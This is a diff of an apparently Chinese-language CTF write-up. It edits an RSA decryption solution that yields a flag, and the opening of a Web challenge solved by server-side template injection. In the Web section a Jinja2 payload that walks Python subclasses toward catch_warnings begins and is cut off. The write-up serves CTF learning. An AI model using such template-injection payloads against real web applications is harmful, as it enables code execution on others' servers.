@@ -840,12 +840,11 @@ q = 1053182869639400942691255701853156650055345070586299648888214255856880544718
 
 N = 114143693083732767570968317133346423549060454090175301453735671171095767847167710539383793168600011860725545060200762757793552681268747848968704851107766270420356743799632674648383021525392085925089984102330388262453473594582267963382904432339836113984790742410134450191464532864589123878301032917283483243847
 
-d = 50742668784054743796077308928583295672870545303739312689100966737709824813210506078737292591220582907244279005756665043057883285178390377660818970279568204675194935893051526661876109033037071837499249580434595390423343646371583506816678001938953327743693429532902954037961714874373553064053942402868925112743</code></pre><p>而后利用 <code>m= pow(c, d, p*q)</code> 求得</p>
-<p>m=14337636555111949737591403676611178785005554188521046827164791353101910846974617354025302694785689419018</p>
-<p>转 Hex 再转 ASCII，得到 flag</p>
+d = 50742668784054743796077308928583295672870545303739312689100966737709824813210506078737292591220582907244279005756665043057883285178390377660818970279568204675194935893051526661876109033037071837499249580434595390423343646371583506816678001938953327743693429532902954037961714874373553064053942402868925112743</code></pre><p>而后利用 <code>m = pow(c, d, p*q)</code> 求得</p>
+<pre><code>m=14337636555111949737591403676611178785005554188521046827164791353101910846974617354025302694785689419018</code></pre><p>转 Hex 再转 ASCII，得到 flag</p>
 <p><code>flag{656092c1-50bb-459c-89ec-4cabc69b4f3e}</code></p>
 <blockquote>
-<p>也可以用 <code>long_to_bytes</code></p>
+<p>也可以用 <code>long_to_bytes</code>（需要安装密码库 <code>pip install pycryptodome</code>）</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number
 <span class="token keyword">print</span><span class="token punctuation">(</span> number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token punctuation">)</span></code></pre>
 <p>想起来之前说要装 GitHub 上那个 python的 RSA tools 还没装……</p>
@@ -874,7 +873,7 @@ flag=??????</code></pre><p>p 和 q 不变，则 </p>
 <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>这次没怎么看 Web 题……（（</p>
 <h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>看到返回的页面上有个注释</p>
 <p><code>&lt;!--ssssssti &amp; a little trick --&gt;</code></p>
-<p>试了一下<code>0</code>可以得到0，于是就是 SSTI 了。好像都不需要绕过。</p>
+<p>试了一下<code>{{1-1}}</code>可以得到 0，于是就是 SSTI 了。好像都不需要绕过。</p>
 <p>payload：</p>
 <pre><code>{% for c in [].__class__.__base__.__subclasses__() %}
 {% if c.__name__ == 'catch_warnings' %}
